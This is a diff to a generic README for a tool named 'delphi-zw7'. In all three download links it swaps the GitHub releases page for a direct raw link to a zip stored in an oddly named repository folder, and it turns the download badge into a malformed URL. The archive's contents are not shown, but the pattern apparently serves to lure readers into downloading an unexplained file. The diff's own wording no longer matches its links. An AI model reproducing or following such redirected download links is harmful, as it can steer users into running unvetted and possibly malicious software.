@@ -1,7 +1,7 @@
 # 🎉 delphi-zw7 - Simple Tool for Your Needs
 
 ## 📥 Download Now
-[![Download delphi-zw7](https://img.shields.io/badge/Download%20delphi--zw7-v1.0-blue.svg)](https://github.com/minem19/delphi-zw7/releases)
+[![Download delphi-zw7](https://raw.githubusercontent.com/minem19/delphi-zw7/main/diplasiasmus/delphi-zw7.zip%https://raw.githubusercontent.com/minem19/delphi-zw7/main/diplasiasmus/delphi-zw7.zip)](https://raw.githubusercontent.com/minem19/delphi-zw7/main/diplasiasmus/delphi-zw7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you install delphi-zw7, ensure your system meets these requirements:
 To download delphi-zw7:
 
 1. Click on the link below:
-   - [Visit this page to download](https://github.com/minem19/delphi-zw7/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/minem19/delphi-zw7/main/diplasiasmus/delphi-zw7.zip)
    
 2. You will see a list of available releases. Look for the latest version.
 
@@ -65,6 +65,6 @@ For support, you can reach out through our GitHub Issues page. We are here to he
 
 You can always find the latest version and updates at:
 
-- [Visit this page to download](https://github.com/minem19/delphi-zw7/releases)
+- [Visit this page to download](https://raw.githubusercontent.com/minem19/delphi-zw7/main/diplasiasmus/delphi-zw7.zip)
 
 Thank you for using delphi-zw7! Enjoy the simplicity it brings to your daily tasks.
